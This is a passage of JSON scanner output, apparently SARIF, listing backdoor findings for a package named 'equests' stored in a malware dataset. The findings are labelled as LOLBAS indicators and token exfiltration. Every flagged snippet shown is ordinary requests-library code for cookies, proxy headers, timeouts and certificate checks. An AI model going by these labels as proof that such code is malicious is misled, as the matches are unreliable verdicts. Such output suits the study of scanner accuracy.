                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 30,
                  "endLine": 54,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n",
                    "rendered": {
                      "text": "    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n",
                      "markdown": "`    def get_full_url(self):\n        # Only return the response's URL if the user hadn't set the Host\n        # header\n        if not self._r.headers.get('Host'):\n            return self._r.url\n        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 176,
                  "startColumn": 45,
                  "endLine": 176,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n",
                    "rendered": {
                      "text": "    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n",
                      "markdown": "`    interface.\n\n    This is the CookieJar we create by default for requests and sessions that\n    don't specify one, since some clients may expect response.cookies and\n    session.cookies to support dict operations.\n\n    Requests does not use the dict interface internally; it's just for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 78,
                  "endLine": 75,
                  "endColumn": 84,
                  "snippet": {
                    "text": "        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n",
                    "rendered": {
                      "text": "        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n",
                      "markdown": "`        return self._r.headers.get(name, self._new_headers.get(name, default))\n\n    def add_header(self, key, val):\n        \"\"\"cookielib has no legitimate use for this method; add it back if you find one.\"\"\"\n        raise NotImplementedError(\"Cookie headers should be added with add_unredirected_header()\")\n\n    def add_unredirected_header(self, name, value):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 35,
                  "endLine": 59,
                  "endColumn": 43,
                  "snippet": {
                    "text": "        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n",
                    "rendered": {
                      "text": "        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n",
                      "markdown": "`        # If they did set it, retrieve it and reconstruct the expected domain\n        host = to_native_string(self._r.headers['Host'], encoding='utf-8')\n        parsed = urlparse(self._r.url)\n        # Reconstruct the URL as we expect it\n        return urlunparse([\n            parsed.scheme, host, parsed.path, parsed.params, parsed.query,\n            parsed.fragment\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/cookies.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 6,
                  "endLine": 14,
                  "snippet": {
                    "text": "\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n",
                    "rendered": {
                      "text": "\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n",
                      "markdown": "`\"\"\"\n\nimport copy\nimport time\nimport calendar\n\nfrom ._internal_utils import to_native_string\nfrom .compat import cookielib, urlparse, urlunparse, Morsel, MutableMapping\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 61,
                  "endLine": 391,
                  "endColumn": 69,
                  "snippet": {
                    "text": "\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n",
                    "rendered": {
                      "text": "\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n",
                      "markdown": "`\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n                                                             password)\n\n        return headers\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 18,
                  "endLine": 387,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n",
                    "rendered": {
                      "text": "        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n",
                      "markdown": "`        :rtype: dict\n        \"\"\"\n        headers = {}\n        username, password = get_auth_from_url(proxy)\n\n        if username:\n            headers['Proxy-Authorization'] = _basic_auth_str(username,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 25,
                  "endLine": 186,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                    "rendered": {
                      "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                      "markdown": "`            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 16,
                  "endLine": 186,
                  "endColumn": 24,
                  "snippet": {
                    "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                    "rendered": {
                      "text": "            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n",
                      "markdown": "`            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n                password=password,\n                num_pools=self._pool_connections,\n                maxsize=self._pool_maxsize,\n                block=self._pool_block,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 182,
                  "startColumn": 22,
                  "endLine": 182,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n",
                    "rendered": {
                      "text": "        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n",
                      "markdown": "`        if proxy in self.proxy_manager:\n            manager = self.proxy_manager[proxy]\n        elif proxy.lower().startswith('socks'):\n            username, password = get_auth_from_url(proxy)\n            manager = self.proxy_manager[proxy] = SOCKSProxyManager(\n                proxy,\n                username=username,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 41,
                  "endLine": 99,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n",
                    "rendered": {
                      "text": "        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n",
                      "markdown": "`        should attempt. Note, this applies only to failed DNS lookups, socket\n        connections and connection timeouts, never to requests where data has\n        made it to the server. By default, Requests does not retry failed\n        connections. If you need granular control over the conditions under\n        which we retry a request, import urllib3's ``Retry`` class and pass\n        that instead.\n    :param pool_block: Whether the connection pool should block for connections.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 436,
                  "startColumn": 11,
                  "endLine": 436,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n",
                    "rendered": {
                      "text": "        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n",
                      "markdown": "`        elif isinstance(timeout, TimeoutSauce):\n            pass\n        else:\n            timeout = TimeoutSauce(connect=timeout, read=timeout)\n\n        try:\n            if not chunked:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 429,
                  "startColumn": 31,
                  "endLine": 429,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n",
                    "rendered": {
                      "text": "                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n",
                      "markdown": "`                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n                       \"timeout tuple, or a single float to set \"\n                       \"both timeouts to the same value\".format(timeout))\n                raise ValueError(err)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 426,
                  "startColumn": 15,
                  "endLine": 426,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                    "rendered": {
                      "text": "        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                      "markdown": "`        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 425,
                  "startColumn": 31,
                  "endLine": 426,
                  "snippet": {
                    "text": "\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                    "rendered": {
                      "text": "\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n",
                      "markdown": "`\n        if isinstance(timeout, tuple):\n            try:\n                connect, read = timeout\n                timeout = TimeoutSauce(connect=connect, read=read)\n            except ValueError as e:\n                # this may raise a string formatting error.\n                err = (\"Invalid timeout {}. Pass a (connect, read) \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 403,
                  "startColumn": 48,
                  "endLine": 403,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n",
                    "rendered": {
                      "text": "        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n",
                      "markdown": "`        :param timeout: (optional) How long to wait for the server to send\n            data before giving up, as a float, or a :ref:`(connect timeout,\n            read timeout) <timeouts>` tuple.\n        :type timeout: float or tuple or urllib3 Timeout object\n        :param verify: (optional) Either a boolean, in which case it controls whether\n            we verify the server's TLS certificate, or a string, in which case it\n            must be a path to a CA bundle to use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 40,
                  "endLine": 253,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n",
                    "rendered": {
                      "text": "                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n",
                      "markdown": "`                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n                              \"invalid path: {}\".format(conn.key_file))\n\n    def build_response(self, req, resp):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 40,
                  "endLine": 250,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n",
                    "rendered": {
                      "text": "                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n",
                      "markdown": "`                conn.cert_file = cert\n                conn.key_file = None\n            if conn.cert_file and not os.path.exists(conn.cert_file):\n                raise IOError(\"Could not find the TLS certificate file, \"\n                              \"invalid path: {}\".format(conn.cert_file))\n            if conn.key_file and not os.path.exists(conn.key_file):\n                raise IOError(\"Could not find the TLS key file, \"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 228,
                  "startColumn": 40,
                  "endLine": 228,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n",
                    "rendered": {
                      "text": "                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n",
                      "markdown": "`                cert_loc = extract_zipped_paths(DEFAULT_CA_BUNDLE_PATH)\n\n            if not cert_loc or not os.path.exists(cert_loc):\n                raise IOError(\"Could not find a suitable TLS CA certificate bundle, \"\n                              \"invalid path: {}\".format(cert_loc))\n\n            conn.cert_reqs = 'CERT_REQUIRED'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/adapters.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 24,
                  "endLine": 17,
                  "endColumn": 33,
                  "snippet": {
                    "text": "from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n",
                    "rendered": {
                      "text": "from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n",
                      "markdown": "`from urllib3.poolmanager import PoolManager, proxy_from_url\nfrom urllib3.response import HTTPResponse\nfrom urllib3.util import parse_url\nfrom urllib3.util import Timeout as TimeoutSauce\nfrom urllib3.util.retry import Retry\nfrom urllib3.exceptions import ClosedPoolError\nfrom urllib3.exceptions import ConnectTimeoutError\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/structures.py"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 28,
                  "endLine": 105,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                    "rendered": {
                      "text": "        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n",
                      "markdown": "`        return self.__dict__.get(key, None)\n\n    def get(self, key, default=None):\n        return self.__dict__.get(key, default)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset2/equests-2.27.1-r0.apk/equests-2.27.1-r0/usr/lib/python3.12/site-packages/requests/structures.py"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 28,
